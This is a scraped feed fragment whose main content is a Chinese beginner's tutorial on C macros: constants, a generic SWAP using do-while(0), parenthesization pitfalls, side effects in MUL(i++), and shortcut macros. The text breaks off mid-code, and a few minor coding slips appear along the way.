</code></pre>
<hr/>
<h3 data-id="heading-10">总结（关键点回顾）</h3>
<ol>
<li><strong>状态机核心三要素</strong>：状态（当前身份）、事件（触发动作）、规则（切换逻辑）；</li>
<li><strong>设计模式核心</strong>：一个唯一的切换入口（<code>trigger</code>）+ 显性的规则（<code>rules</code>）+ 分离的业务逻辑（<code>onChange</code>）；</li>
<li><strong>核心好处</strong>：拦截非法操作、避免状态混乱、逻辑清晰易维护，哪怕是简单场景也能少写bug。 这个设计模式不用依赖任何第三方库，纯原生JS就能实现，新手也能快速上手，是前端状态机最基础、最易懂的写法。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[c语言宏定义详细讲解，以及实操迅速理解掌握]]></title>    <link>https://juejin.cn/post/7603043152672505871</link>    <guid>https://juejin.cn/post/7603043152672505871</guid>    <pubDate>2026-02-05T09:39:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603043152672505871" data-draft-id="7602916013877526543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="c语言宏定义详细讲解，以及实操迅速理解掌握"/> <meta itemprop="keywords" content="嵌入式"/> <meta itemprop="datePublished" content="2026-02-05T09:39:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="歪比巴卜273"/> <meta itemprop="url" content="https://juejin.cn/user/2578802574264489"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            c语言宏定义详细讲解，以及实操迅速理解掌握
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578802574264489/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    歪比巴卜273
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:39:23.000Z" title="Thu Feb 05 2026 09:39:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本博客分为以下三个部分，如果了解宏定义的可以直接到宏的函数定义张杰看看泛型和技巧</p>
<ol>
<li>宏定义讲解和介绍</li>
<li>宏定义提升</li>
<li>宏定义实践实现一个自编写报错</li>
</ol>
<h2 data-id="heading-0">宏定义讲解和介绍</h2>
<h4 data-id="heading-1">首先什么是宏定义？？</h4>
<p>宏定义本质可以理解成一种<strong>文本替换</strong>，文本替换就是把你这个东西直接复制到使用的位置，<strong>注意文本替换是重点</strong>，但是这先不说我们先说宏定义的两种格式</p>
<ol>
<li>对象式定义(其实就是定义一个对象)</li>
<li>函数式定义(其实就是定义一个函数)</li>
</ol>
<h3 data-id="heading-2">1.对象式定义</h3>
<p>我们先来看对象式定义，也就是定义一个对象语法上格式为
<code>#define 宏定义名 值</code>，比如下面的例子，<strong>注意这个值必须是常量</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PI 3.14<span class="hljs-comment">//PI代表圆周率那运算我们就可以写成</span></span>
s=r*r*PI;
</code></pre>
<p>那使用宏定义写的好处是什么呢？</p>
<p><strong>实用原因：
1.容易读懂</strong> 你看这个宏定义名字就知道它代表的内容</p>
<p><strong>2.方便修改：</strong> 例如，计算多组圆的面积,看下面例子</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//假设不使用这个宏定义而是直接用一个数代表圆周率</span>
s1=r1*r2*<span class="hljs-number">3.14</span>,s2=r2*r2*<span class="hljs-number">3.14</span>,s3=r3*r3*<span class="hljs-number">3.14</span>;
<span class="hljs-comment">//使用宏定义</span>
s1=r1*r2*PI,s2=r2*r2*PI,s3=r3*r3*PI;
</code></pre>
<p>当我感觉PI精度不够需要从3.14换成这个3.141592的时候，第一种就需要一个个修改如果是使用宏定义直接修改#define PI 3.141592;即可</p>
<p>那使用宏d对象定义有什么坏处吗？
有的有的兄弟，首先我们<strong>抓住它文本替换的特点</strong>那么就决定了它</p>
<ol>
<li>本身是文本不是变量没有类型</li>
<li>没有这个作用域，使用#undef终止</li>
<li>没有内存分配</li>
<li>是文本不支持调试
因此对于如果你想使用常量我的建议还是使用const关键字定义，有类型，可调试，有内存分配，有作用域
那有的人就问了那合着白看来直接用const就一劳永逸了，但是注意上面只是宏对象定义，我个人认为宏定义的精髓很大一部分是<strong>宏函数定义</strong>接下来我们一起来看</li>
</ol>
<h3 data-id="heading-3">2.宏的函数定义</h3>
<p><strong>格式：</strong> #define 函数名(参数列表) 实现</p>
<p><strong>例如：</strong> #define MAX(a,b) ((a)&gt;(b))?(a):(b)</p>
<p><em><strong>注意函数名和参数列表之间无空格，空格在实现和参数列表之间</strong></em>
上面的代码就是定义了一个宏定义的比较最大的函数，可能有的朋友感觉嗯……这我自己定义一个函数不是也可以吗？为什么还写宏定义，但是我们记住宏定义的特点是<strong>文本替换</strong>，注意这个性质就保证了它有很多意想不到的效果</p>
<h4 data-id="heading-4">泛型编程的使用</h4>
<p>泛型就是什么类型都支持的意思，对于一个函数swap交换函数如果我们使用普通函数实现你会发现我必须是下面这样,<strong>声明好参数类型</strong>然后<strong>只能使用者这个类型</strong>，那如果你有多种类型的交换呢定义swap_int,swap_double?</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;
</code></pre>
<p>我们来看看宏定义，宏定义是文本替换就是简单把你给的值传递过去，不需要管类型我什么类型都能传递，也就是我们的这个SWAP所有类型可用例如说下面的代码</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAP(type,a,b) do{\    </span>
     type temp=a;\  
     a=b;\  
    b=temp;\  
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)  
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
    <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;  
    SWAP(<span class="hljs-type">int</span>,a,b);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d %d"</span>,a,b);  
}
</code></pre>
<ol>
<li>因为宏定义需要是写在一行你加上\其实意思就类似代表这一行没结束衔接下面</li>
<li>type是你传递过来的类型
可以尝试照着写试一下，do-while(0){}一会再看</li>
</ol>
<h4 data-id="heading-5">思考小问</h4>
<p>注意为什么明明我的这个宏定义函数我<strong>传递的是值</strong>也会更改呢不是说函数中值传递不更改值吗？
因为这个地方不是函数调用我们在重复一遍宏定义本质是<strong>文本替换</strong>也就是说其实我们代码变成了这个样子</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
    <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;  
    <span class="hljs-keyword">do</span>{  
        <span class="hljs-type">int</span> temp=a;  
        a=b;  
        b=temp;  
    }<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d %d"</span>,a,b);  
}
</code></pre>
<p>如果有比较细心的兄弟就会发现了，这个do-while(0)的作用妙不可言了,我do-while(0);本身语法是需要;结尾的宏定义中没有写这个;这里刚刚好补上了,可能有人就会说那你本身不用这个do-while(0)用括号不就好了吗？但是如果用括号我们来看假设下面的情况</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">if</span>(cond)
SWAP(a,b);<span class="hljs-comment">//</span>
<span class="hljs-keyword">else</span>
...
<span class="hljs-comment">//文本替换展开</span>
<span class="hljs-keyword">if</span>(cond)<span class="hljs-comment">//此处我们将这个do-while(0)换成括号</span>
{
};<span class="hljs-comment">//注意这个地方有个分号会断开后面的else，使用do-while(0)就能吸收了这个;</span>
<span class="hljs-keyword">else</span>
...
</code></pre>
<p>可能有的同学感觉没问题我if{}不就可以了吗，但是这个宏定义可能不止你一个用有的人就是喜欢使用if SWAP(a,b);然后他逻辑完全没问题，但是这个错误他会一直找不到</p>
<p><strong>因此注意宏定义是文本替换无法调试，虽然可以很好解决泛型问题但是要严谨严谨，有多条语句就使用do-while(0)</strong>
当然除了这个宏定义还有一些别的毛病，宏定义因为其本质其实是文本替换，因此经常会触发二义性
####宏定义二义性问题(常考)</p>
<h5 data-id="heading-6">参数未加括号</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) x*x</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<p>运行结果为19，因为我们直接文本替换x<em>x会变成9+1</em>9+1=19 修改成下面形式即可,(<strong>注意我们上面的代码就没加，上面不加是较少繁琐内容先帮助大家理解</strong>)</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) (x)*(x)</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<h5 data-id="heading-7">参数加上但是整体未加</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) (x)*(x)</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-number">200</span>/<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));<span class="hljs-comment">//输出为200</span>
}
</code></pre>
<p>本来结果应该是2，但是因为只是文本替换会变成200/(9+1) <em>(9+1)结果就是先/10后</em>10大小不变，因此我们还需要整体加上()变成200/((9+1)**(9+1))；</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) ((x)*(x))</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,<span class="hljs-number">200</span>/<span class="hljs-built_in">MUL</span>(<span class="hljs-number">9</span>+<span class="hljs-number">1</span>));
}
</code></pre>
<h5 data-id="heading-8">虽然都加上了括号但是因为操作导致问题</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> MUL(x) ((x)*(x))</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span>(i&lt;=<span class="hljs-number">5</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,<span class="hljs-built_in">MUL</span>(i++));<span class="hljs-comment">//输出2 12 30,为什么不是5次i*i因为每次其实i++会执行两次</span>
    }
}
</code></pre>
<p>因此一些建议对于宏定义</p>
<ol>
<li>每个参数加上这个()避免踩坑</li>
<li>使用do-while()</li>
<li>不要在传参数的时候运算
宏定义的文本替换除了解决了泛型问题其实在这个设计上也有帮助(下期结合例子说)，其次就是这个编程的技巧</li>
</ol>
<h4 data-id="heading-9">技巧</h4>
<p>根据文本替换的特点我们可以偷很多懒比如说常用的for循环每次都写三参数太麻烦了,Printf每次写着太麻烦了都可以宏定义实现(注意这样可能导致别人很难看你的代码)，效果运行一下你就知道了，包邪修的</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> FOR(n) for(int i=0;i&lt;(n);i++) <span class="hljs-comment">//for循环不取等  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> FORE(n) for(int i=0;i&lt;(n);i++) <span class="hljs-comment">//取等  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> Printf(n,ch) printf(<span class="hljs-string">"%d%c"</span>,(n),(ch))<span class="hljs-comment">//给这个数以及用什么隔开  </span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> Scanf(n) scanf(<span class="hljs-string">"%d"</span>,&amp;(n))  </span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
